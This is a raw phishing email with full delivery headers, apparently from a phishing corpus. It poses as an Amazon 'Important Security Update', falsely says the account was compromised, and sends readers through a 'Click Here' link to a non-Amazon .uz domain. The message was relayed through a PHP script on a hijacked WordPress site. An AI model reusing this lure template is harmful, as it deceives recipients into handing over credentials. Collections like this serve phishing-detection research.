@@ -1,0 +1,79 @@
+Return-Path: <125117@ihp-osb-lngweb5.ihp.iinet.net.au>
+X-Original-To: jose@login.monkey.org
+Delivered-To: jose@login.monkey.org
+Received: from forward.b.hostedemail.com (forward.b.hostedemail.com [64.98.36.17])
+	by l.monkey.org (Postfix) with ESMTP id 180E6F4007
+	for <jose@login.monkey.org>; Fri,  2 Jan 2015 07:19:00 -0600 (CST)
+Received: from smtpin10.hostedemail.com (10.5.19.251.rfc1918.com [10.5.19.251])
+	by ofarelay01.b.hostedemail.com (Postfix) with SMTP id 6E3BF34E368
+	for <jose@login.monkey.org>; Fri,  2 Jan 2015 13:18:59 +0000 (UTC)
+X-Forwarded-For: jose@monkey.org by Hostedemail
+Delivered-To: jose@monkey.org
+X-FDA: 69706560798.10.water55_6b398d6d93b0f
+Authentication-Results: auth.b.hostedemail.com; dmarc=none header.from=croydonpodiatrygroup.com.au
+Authentication-Results: auth.b.hostedemail.com; dkim=none
+	reason="no signature"; dkim-adsp=none (insecure policy);
+	dkim-atps=neutral
+X-Spam-Summary: 88,1.2,0,3a7d6625610983ed,d41d8cd98f00b204,125117@ihp-osb-lngweb5.ihp.iinet.net.au,:,RULES_HIT:1:2:41:42:72:355:375:379:962:967:969:973:978:983:988:989:1189:1208:1224:1260:1261:1311:1313:1314:1345:1381:1431:1432:1433:1434:1437:1515:1516:1517:1545:1568:1571:1589:1714:1730:1747:1777:1792:1803:2194:2198:2199:2200:2393:2525:2527:2560:2567:2610:2682:2685:2691:2731:2741:2859:2890:2895:2900:2920:2924:2926:2933:2937:2939:2942:2945:2947:2951:2954:3022:3138:3139:3140:3141:3142:3148:3747:3867:3873:3874:3902:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:3976:4042:4051:4321:5007:6248:6261:6678:8518:8599:8603:9025:9040:9072:9388:9908:10008:10049:10346:11473:11529:11537:11657:11658:11914:12043:12438:12555:12740:12776:12812:12956:12958:13025:13038:13894:14096:14246:21080,0,RBL:203.59.1.152-irl.urbl.hostedemail.com-127.0.0.175,CacheIP:none,Bayesian:0.5,0.5,0.5,Netcheck:none,DomainCache:0,MSF:not bulk,SPF:fp,MSBL:0,DNSBL:neutral,Custom_rules:0:1:0
+X-HE-Tag: water55_6b398d6d93b0f
+X-Filterd-Recvd-Size: 10152
+Received: from hosted.icp-osb-irony-out2.external.iinet.net.au (hosted.icp-osb-irony-out2.external.iinet.net.au [203.59.1.152])
+	by imf25.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Fri,  2 Jan 2015 13:18:56 +0000 (UTC)
+X-IronPort-Anti-Spam-Filtered: true
+X-IronPort-Anti-Spam-Result: AukQAN2ZplTKO2/h/2dsb2JhbABcgkNDUlgEsXgSAYRigScBjh2GFmIWAQEBAQF9ggoBAYIYIQEDElkUDCh0hztdDpEPg1MBh3uHQolMUIMkgRWNWI8VEQFhDIJdgTYFgxYBhjOCdIFXgz+Bf4RCMII1giiBaIFogVWCWAiDMSKBUAEBAYIoMTEBgQQHFyJYHQkBAQE
+X-IronPort-AV: E=Sophos;i="5.07,684,1413216000"; 
+   d="scan'208,217";a="289392423"
+Received: from unknown (HELO ihp-osb-lngweb5.ihp.iinet.net.au) ([202.59.111.225])
+  by icp-osb-irony-out2.iinet.net.au with ESMTP; 02 Jan 2015 21:18:53 +0800
+Received: from ihp-osb-lngweb5.ihp.iinet.net.au (ihp-osb-lngweb5.ihp.iinet.net.au [127.0.0.1])
+	by ihp-osb-lngweb5.ihp.iinet.net.au (8.13.8/8.13.8) with ESMTP id t02DIrHS205249
+	for <jose@monkey.org>; Fri, 2 Jan 2015 21:18:53 +0800
+Received: (from 125117@localhost)
+	by ihp-osb-lngweb5.ihp.iinet.net.au (8.13.8/8.13.8/Submit) id t02DIr6H205245;
+	Fri, 2 Jan 2015 21:18:53 +0800
+Date: Fri, 2 Jan 2015 21:18:53 +0800
+Message-Id: <201501021318.t02DIr6H205245@ihp-osb-lngweb5.ihp.iinet.net.au>
+To: jose@monkey.org
+Subject: Important Security Update
+X-PHP-Script: croydonpodiatrygroup.com.au/wp-admin/hatty.php for 69.28.67.53
+From: "Amazon.com" <amazon@croydonpodiatrygroup.com.au>
+Reply-To: amazon@croydonpodiatrygroup.com.au
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 2
+
+<HTML><BODY><P>
+<TABLE style="PADDING-BOTTOM: 0px; TEXT-TRANSFORM: none; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; MARGIN: 0px auto; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; DISPLAY: table; BORDER-COLLAPSE: separate; FONT: 12px/16px Arial, sans-serif; WHITE-SPACE: normal; LETTER-SPACING: normal; COLOR: rgb(51,51,51); WORD-SPACING: 0px; PADDING-TOP: 0px; -webkit-text-stroke-width: 0px" id=yiv1765527594container cellSpacing=0 cellPadding=0 width=640>
+<TBODY style="WIDTH: 680px" id=yiv1765527594yui_3_7_2_1_1379861065108_2082>
+<TR style="DISPLAY: table-row; VERTICAL-ALIGN: inherit" id=yiv1765527594yui_3_7_2_1_1379861065108_2135>
+<TD style="PADDING-BOTTOM: 10px; PADDING-LEFT: 20px; BORDER-SPACING: 2px; WIDTH: 100px; PADDING-RIGHT: 0px; DISPLAY: table-cell; BORDER-COLLAPSE: collapse; PADDING-TOP: 20px" id=yiv1765527594topNav vAlign=top><A style="OUTLINE-STYLE: none; OUTLINE-COLOR: invert; OUTLINE-WIDTH: 0px; COLOR: rgb(40,98,197); TEXT-DECORATION: underline" id=yui_3_7_2_1_1379864308382_1992 title="Visit Amazon.com" href="https://www.amazon.com/ref=pe_175190_21431760_M3T1_SC_g_i" rel=nofollow target=_blank><IMG style="BORDER-BOTTOM: 0px; BORDER-LEFT: 0px; FONT-SIZE: 11px; BORDER-TOP: 0px; BORDER-RIGHT: 0px" id=yiv1765527594amazonLogo border=0 alt=Amazon src="http://g-ecx.images-amazon.com/images/G/01/x-locale/cs/te/logo.png" width=107 height=31></A></TD>
+<TD style="TEXT-ALIGN: right; PADDING-BOTTOM: 0px; PADDING-LEFT: 20px; BORDER-SPACING: 2px; PADDING-RIGHT: 20px; DISPLAY: table-cell; PADDING-TOP: 0px" id=yui_3_7_2_1_1379864308382_1976></TD></TR>
+<TR style="DISPLAY: table-row; VERTICAL-ALIGN: inherit" id=yiv1765527594yui_3_7_2_1_1379861065108_2081>
+<TD style="BORDER-SPACING: 2px; WIDTH: 640px; DISPLAY: table-cell" id=yiv1765527594yui_3_7_2_1_1379861065108_2080 colSpan=2>
+<P style="PADDING-BOTTOM: 0px; MARGIN: 15px 20px 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; DISPLAY: block; FONT: 18px Arial, sans-serif; COLOR: rgb(204,102,0); PADDING-TOP: 0px" id=yiv1765527594yui_3_7_2_1_1379861065108_2091>Dear Customer,</P>
+<P style="PADDING-BOTTOM: 0px; MARGIN: 15px 20px 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; DISPLAY: block; FONT: 18px Arial, sans-serif; COLOR: rgb(204,102,0); PADDING-TOP: 0px" id=yui_3_7_2_1_1379864308382_1995><SPAN style="TEXT-TRANSFORM: none; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; DISPLAY: inline; FONT: 12px/16px Arial, sans-serif; WHITE-SPACE: normal; FLOAT: none; LETTER-SPACING: normal; COLOR: rgb(51,51,51); WORD-SPACING: 0px" id=yui_3_7_2_1_1379864308382_1994>You have received this email because we believe that your amazon account has been recently compromised.</SPAN><SPAN style="TEXT-TRANSFORM: none; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; DISPLAY: inline; FONT: 12px/16px Arial, sans-serif; WHITE-SPACE: normal; FLOAT: none; LETTER-SPACING: normal; COLOR: rgb(51,51,51); WORD-SPACING: 0px" id=yui_3_7_2_1_1379864308382_2012>.</SPAN></P><SPAN style="TEXT-TRANSFORM: none; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; DISPLAY: inline; FONT: 12
+ px/16px Arial, sans-serif; WHITE-SPACE: normal; FLOAT: none; LETTER-SPACING: normal; COLOR: rgb(51,51,51); WORD-SPACING: 0px" id=yui_3_7_2_1_1379864308382_1997>
+<P style="BORDER-BOTTOM: rgb(204,204,204) 1px solid; PADDING-BOTTOM: 3px; MARGIN: 0px 20px 3px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; DISPLAY: block; FONT: 18px Arial, sans-serif; COLOR: rgb(204,102,0); PADDING-TOP: 0px" id=yui_3_7_2_1_1379864308382_1996> </P>
+<P style="BORDER-BOTTOM: rgb(204,204,204) 1px solid; PADDING-BOTTOM: 3px; MARGIN: 0px 20px 3px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; DISPLAY: block; FONT: 18px Arial, sans-serif; COLOR: rgb(204,102,0); PADDING-TOP: 0px" id=yui_3_7_2_1_1379864308382_2000><FONT id=yui_3_7_2_1_1379864308382_1999 size=2><FONT color=#333333>Click<SPAN class=Apple-converted-space> </SPAN></FONT><A style="OUTLINE-STYLE: none; OUTLINE-COLOR: invert; OUTLINE-WIDTH: 0px; COLOR: rgb(40,98,197); TEXT-DECORATION: underline" href="http://irc-sspo.uz/a" rel=nofollow target=_blank><FONT size=+0><FONT size=+0>Here</FONT><SPAN class=Apple-converted-space> </SPAN></FONT></A><FONT id=yui_3_7_2_1_1379864308382_1998 color=#333333>to update your account</FONT></FONT></P></SPAN>
+<P style="PADDING-BOTTOM: 0px; MARGIN: 15px 20px 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; DISPLAY: block; FONT: 18px Arial, sans-serif; COLOR: rgb(204,102,0); PADDING-TOP: 0px" id=yui_3_7_2_1_1379864308382_2001><SPAN style="TEXT-TRANSFORM: none; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; DISPLAY: inline; FONT: 12px/16px Arial, sans-serif; WHITE-SPACE: normal; FLOAT: none; LETTER-SPACING: normal; COLOR: rgb(51,51,51); WORD-SPACING: 0px">
+<TABLE style="PADDING-BOTTOM: 0px; TEXT-TRANSFORM: none; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; MARGIN: 0px auto; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; DISPLAY: table; BORDER-COLLAPSE: separate; FONT: 12px/16px Arial, sans-serif; WHITE-SPACE: normal; LETTER-SPACING: normal; COLOR: rgb(51,51,51); WORD-SPACING: 0px; PADDING-TOP: 0px; -webkit-text-stroke-width: 0px" id=yiv1765527594container cellSpacing=0 cellPadding=0 width=640>
+<TBODY style="WIDTH: 680px" id=yiv1765527594yui_3_7_2_1_1379861065108_2082>
+<TR style="DISPLAY: table-row; VERTICAL-ALIGN: inherit" id=yui_3_7_2_1_1379864308382_1984>
+<TD style="PADDING-BOTTOM: 0px; LINE-HEIGHT: 22px; PADDING-LEFT: 20px; BORDER-SPACING: 2px; WIDTH: 640px; PADDING-RIGHT: 20px; DISPLAY: table-cell; PADDING-TOP: 0px" id=yui_3_7_2_1_1379864308382_1983 colSpan=2>
+<P style="PADDING-BOTTOM: 0px; LINE-HEIGHT: normal; MARGIN: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; DISPLAY: block; BORDER-TOP: rgb(204,204,204) 1px solid; PADDING-TOP: 20px" id=yui_3_7_2_1_1379864308382_1982>Returns are easy. Visit our<SPAN class=yiv1765527594Apple-converted-space> </SPAN><A style="OUTLINE-STYLE: none; OUTLINE-COLOR: invert; OUTLINE-WIDTH: 0px; COLOR: rgb(0,102,153); TEXT-DECORATION: underline" id=yui_3_7_2_1_1379864308382_2117 href="http://www.amazon.com/gp/css/returns/homepage.html/ref=pe_175190_21431760_M3T1_SC_r" rel=nofollow target=_blank>Online Return Center</A>.<SPAN class=yiv1765527594Apple-converted-space> </SPAN><BR>If you need further assistance with your order, please visit<SPAN class=yiv1765527594Apple-converted-space> </SPAN><A style="OUTLINE-STYLE: none; OUTLINE-COLOR: invert; OUTLINE-WIDTH: 0px; COLOR: rgb(0,102,153); TEXT-DECORATION: underline" href="http://www.amazon.com/customer-service?ref=pe_175190_21431760_M3T1_SC_cs" rel=nofollow target=_b
+ lank>Customer Service</A>.</P></TD></TR>
+<TR style="DISPLAY: table-row; VERTICAL-ALIGN: inherit" id=yiv1765527594yui_3_7_2_1_1379861065108_2111>
+<TD style="PADDING-BOTTOM: 0px; LINE-HEIGHT: 22px; PADDING-LEFT: 20px; BORDER-SPACING: 2px; WIDTH: 640px; PADDING-RIGHT: 20px; DISPLAY: table-cell; PADDING-TOP: 0px" id=yiv1765527594yui_3_7_2_1_1379861065108_2110 colSpan=2>
+<P style="BORDER-BOTTOM: rgb(234,234,234) 1px solid; PADDING-BOTTOM: 20px; LINE-HEIGHT: normal; MARGIN: 10px 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; DISPLAY: block; PADDING-TOP: 0px" id=yiv1765527594yui_3_7_2_1_1379861065108_2109>We hope to see you again soon!</P>
+<P style="BORDER-BOTTOM: rgb(234,234,234) 1px solid; PADDING-BOTTOM: 20px; LINE-HEIGHT: normal; MARGIN: 10px 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; DISPLAY: block; PADDING-TOP: 0px" id=yui_3_7_2_1_1379864308382_2121><SPAN style="FONT: 14px Arial, san-serif"><STRONG style="FONT-WEIGHT: bold">Amazon.com</STRONG></SPAN></P></TD></TR>
+<TR style="DISPLAY: table-row; VERTICAL-ALIGN: inherit" id=yiv1765527594yui_3_7_2_1_1379861065108_2099>
+<TD style="PADDING-BOTTOM: 10px; PADDING-LEFT: 20px; BORDER-SPACING: 2px; PADDING-RIGHT: 20px; DISPLAY: table-cell; PADDING-TOP: 10px" id=yiv1765527594yui_3_7_2_1_1379861065108_2098 colSpan=2></TD></TR>
+<TR style="DISPLAY: table-row; VERTICAL-ALIGN: inherit" id=yiv1765527594yui_3_7_2_1_1379861065108_2094>
+<TD style="PADDING-BOTTOM: 20px; LINE-HEIGHT: 16px; PADDING-LEFT: 20px; BORDER-SPACING: 2px; WIDTH: 640px; PADDING-RIGHT: 20px; DISPLAY: table-cell; COLOR: rgb(102,102,102); FONT-SIZE: 10px; PADDING-TOP: 0px" id=yiv1765527594yui_3_7_2_1_1379861065108_2093 colSpan=2>
+<P style="PADDING-BOTTOM: 0px; LINE-HEIGHT: normal; MARGIN: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; DISPLAY: block; PADDING-TOP: 0px" id=yiv1765527594yui_3_7_2_1_1379861065108_2095>This email was sent from a notification-only address that cannot accept incoming email. Please do not reply to this message.</P></TD></TR></TBODY></TABLE></SPAN></P></TD></TR></TBODY></TABLE></P></BODY></HTML>
+
